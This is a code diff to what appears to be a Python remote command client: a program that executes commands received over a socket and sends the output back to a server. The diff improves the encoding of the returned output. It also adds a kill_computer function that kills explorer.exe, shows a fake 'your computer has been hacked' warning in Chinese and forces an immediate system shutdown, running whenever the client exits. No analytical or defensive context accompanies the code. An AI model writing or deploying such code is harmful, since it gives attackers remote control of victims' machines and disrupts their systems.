@@ -2,6 +2,26 @@ import socket
 import subprocess
 import sys
 import locale
+import tkinter as tk
+from tkinter import messagebox
+import os
+import psutil
+
+
+
+def kill_computer():
+    # 提示当前计算机被入侵
+    root = tk.Tk()
+    root.withdraw()
+    for proc in psutil.process_iter(['name']):
+        if proc.info['name'] == 'explorer.exe':
+            proc.kill()  # 杀死文件资源管理器进程
+    messagebox.showwarning("警告", "您的计算机已被入侵！\n我们为了你的设备的安全，即将进行关机操作。")
+    os.system("shutdown -s -t 0")
+    sys.exit()
+
+
+    
 
 
 
@@ -55,7 +75,9 @@ def main():
                 # 如果输出为空，则返回 "--NONE--"
                 if not output.strip():
                     output = b"--NONE--"
-                client.send(output)  # 发送命令输出
+                # 先使用系统默认编码解码，然后再用UTF-8编码发送给服务器
+                output_utf8 = output.decode(system_encoding, errors='replace').encode('utf-8')
+                client.send(output_utf8)  # 发送转换编码后的命令输出
             else:
                 continue
         except Exception as e:
@@ -64,4 +86,8 @@ def main():
     client.close()  # 在循环外关闭连接
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception as e:
+        print("发生异常:", e)
+    kill_computer()
